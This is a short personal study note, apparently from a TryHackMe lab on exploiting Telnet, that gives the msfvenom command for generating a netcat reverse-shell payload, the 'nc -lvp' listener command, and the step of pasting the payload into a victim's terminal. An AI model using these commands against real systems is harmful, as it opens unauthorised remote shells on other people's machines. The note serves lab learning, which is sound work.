
# How to generate and encode a netcat reverse shell

-> msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R       (!! [] note needed when writing IP)

I wil generate a command line you'll need to add in the terminal of the victim. But before that, we need to start anetcat listener on our local machine to get the reverse shell

-> nc -lvp [listening port]   (!! same as above)

THEN paste the command line obtained from the msfvenom step in the terminal of the victim.

## Source : 
Tryhackme, Network Services, Exploiting Telnet : https://tryhackme.com/room/networkservices

